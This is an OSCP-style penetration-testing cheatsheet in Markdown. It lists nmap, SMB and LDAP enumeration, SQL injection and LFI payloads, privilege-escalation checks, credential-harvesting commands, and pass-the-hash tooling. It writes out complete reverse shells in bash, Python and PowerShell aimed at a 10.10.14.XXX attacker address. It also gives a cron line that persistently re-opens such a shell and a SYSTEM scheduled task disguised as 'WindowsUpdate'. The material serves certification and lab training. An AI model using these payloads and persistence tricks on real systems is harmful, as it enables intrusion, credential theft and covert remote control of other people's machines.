---
title: Quick Reference & Cheatsheet
description: Fast lookup for common commands and workflows
tags: [reference, cheatsheet, oscp]
---

# ⚡ Quick Reference Cheatsheet

> One-page lookup for the most common OSCP commands and workflows.

---

## 🚀 Initial Access Workflow

### 1. Port Scan
```bash
nmap -sn 10.10.10.0/24             # Ping sweep
nmap -p- --min-rate=1000 10.10.10.1 # Fast port scan (-p- = all ports)
nmap -sV -sC -p- 10.10.10.1 -oN out.txt  # Service fingerprinting
```

### 2. Web Enumeration (if HTTP/HTTPS found)
```bash
ffuf -w wordlist.txt -u http://target/FUZZ -mc 200,301 -c
burp suite → Burp → Repeater → Manual testing
nuclei -target http://target -as -s high,critical
```

### 3. SMB Enumeration (if port 445 found)
```bash
smbmap -u guest -p "" -H 10.10.10.1        # Null session
enum4linux-ng -A 10.10.10.1                # Comprehensive SMB enum
smbclient -L \\10.10.10.1 -N               # List shares
```

### 4. LDAP Enumeration (if port 389 found / Active Directory)
```bash
ldapsearch -x -h 10.10.10.1 -s base namingcontexts          # Discover base
ldapsearch -x -h 10.10.10.1 -b "DC=domain,DC=local" "*" | grep sAMAccountName
```

---

## 💻 Common Exploitations

### SQL Injection
```sql
admin' or '1'='1'--                    # Authentication bypass
' ORDER BY 1--                         # Determine columns
' UNION SELECT database(), user(), @@version--
```

### File Upload RCE
```
1. Upload shell.php.jpg (double extension)
2. Access uploaded file
3. Include via LFI or direct access
4. Execute commands
```

### LFI to RCE
```
php://filter/convert.base64-encode/resource=index.php  # Read PHP
/index.php?page=expect://whoami                        # Expect wrapper
/index.php?page=php://input (+ POST data)              # Input wrapper
```

---

## 🔑 Privilege Escalation

### Linux

```bash
# Enumeration
sudo -l                                    # Check sudo rights
find / -perm -4000 2>/dev/null             # SUID binaries
getcap -r / 2>/dev/null                    # Binaries with capabilities
cat /etc/crontab                           # Cron jobs
```

**Quick PrivEsc Vectors:**
- SUID binary abuse
- Sudo without password
- Writable /etc/passwd
- Wildcard abuse in cron
- Kernel exploit (if very old kernel)

### Windows

```powershell
whoami /all                                # Current user privileges
Get-Service | ? {$_.Status -eq 'Running'}  # Running services
Get-Process                                # Running processes
schtasks /query /fo LIST                   # Scheduled tasks
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Quick PrivEsc Vectors:**
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Token impersonation (PrintSpoofer)
- SeBackupPrivilege (registry dumping)

---

## 🔐 Credential Harvesting

### Linux

```bash
cat ~/.bash_history | grep -i password
find ~ -name "*.key" -o -name "*.pem" -o -name "*rsa*"
cat ~/.ssh/authorized_keys
grep -r "password\|api_key" /etc/
```

### Windows

```powershell
cmdkey /list                               # Saved credentials
Get-PSReadlineOption | Select HistorySavePath
type $PROFILE\PSReadLine\ConsoleHost_history.txt
```

---

## 🔄 Lateral Movement

### SSH with Private Key
```bash
scp user@target:~/.ssh/id_rsa ./
ssh -i id_rsa user@target
```

### WinRM with Credentials
```powershell
$credential = New-Object System.Management.Automation.PSCredential("user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
Invoke-Command -ComputerName target -Credential $credential -ScriptBlock { whoami }
```

### Pass-the-Hash
```bash
evil-winrm -i target -u user -H <NTLM_HASH>
impacket-smbexec -hashes :<HASH> domain/user@target
```

---

## 🐚 Reverse Shells

### Bash (Most Common)
```bash
bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1
```

### Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.XXX",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### PowerShell
```powershell
$ip="10.10.14.XXX"; $port=4444; $client=New-Object System.Net.Sockets.TCPClient($ip,$port); $stream=$client.GetStream(); [byte[]]$buffer=0..65535|%{0}; while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i); $sendback=(iex $data 2>&1|Out-String); $sendback2=$sendback+"PS>"; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()
```

### Listener
```bash
nc -lnvp 4444
# OR with socat for better shell
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

---

## 📊 Hash Cracking

```bash
# Identify hash type
hashcat --identify hash.txt

# MD5
hashcat -m 0 hashes.txt wordlist.txt

# NTLM
hashcat -m 1000 hashes.txt wordlist.txt

# SHA256
hashcat -m 1400 hashes.txt wordlist.txt

# Kerberoast (RC4)
hashcat -m 13100 krb_hashes.txt wordlist.txt
```

---

## 🎯 Common Services

| Port | Service | Quick Enum | Default Creds |
|------|---------|-----------|----------------|
| 21 | FTP | `ftp -n <ip>` + `ls` | anonymous:anonymous |
| 22 | SSH | `ssh -v user@ip` | Try common (admin, root) |
| 25 | SMTP | `telnet <ip> 25` | Try VRFY |
| 53 | DNS | `dig @<ip> axfr @domain` | Zone transfer |
| 80/443 | HTTP/HTTPS | ffuf, Burp | Depends on app |
| 135/445 | SMB | enum4linux-ng | guest/guest or anonymous |
| 389 | LDAP | ldapsearch | anonymous bind |
| 1433 | MSSQL | `mssqlclient user@ip` | sa:sa |
| 3306 | MySQL | `mysql -u root -p` | root: (no password) |
| 3389 | RDP | `xfreerdp /v:ip` | admin:admin |
| 5432 | PostgreSQL | `psql -U postgres -h ip` | postgres:(no password) |
| 6379 | Redis | `redis-cli -h ip` | (no auth) |
| 27017 | MongoDB | `mongosh <ip>` | (no auth) |

---

## 📁 File Locations

### Linux
```
/etc/passwd                    # Users
/etc/shadow                    # Hashes (if root)
/etc/sudoers                   # Sudo rules
/home/*/.ssh/                  # SSH keys
/var/log/auth.log              # Auth logs
/proc/self/environ             # Environment
```

### Windows
```
C:\Windows\System32\config\SAM           # Local hashes
C:\Windows\System32\drivers\etc\hosts    # Hosts file
C:\Users\*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt  # PS history
C:\inetpub\wwwroot\                     # Web root
```

---

## 🔄 Persistence

### Linux (Cron)
```bash
(crontab -l; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1") | crontab -
```

### Windows (Scheduled Task)
```powershell
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\proof.txt"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -User SYSTEM
```

---

## 📸 Documentation Reminders

✅ **Always capture:**
- Initial shell (whoami, id, hostname)
- Flag/proof of exploitation
- Privilege escalation proof
- Lateral movement evidence
- Persistence mechanism (if applicable)

✅ **Document:**
- Every command used
- Why you tried it (methodology, not just output)
- What you learned
- What didn't work (and why)

---

## 🔗 Full References

- [[00-Index|Main Index]] — Complete navigation
- [[Enumeration/00-Enumeration-Index|Enumeration Techniques]]
- [[Exploitation/00-Exploitation-Index|Exploitation Techniques]]
- [[Tools-Reference/00-Tools-Index|Tools Documentation]]
- [[Payloads/00-Payloads-Index|Payloads & Shells]]

---

**Last Updated**: 2026-10-07
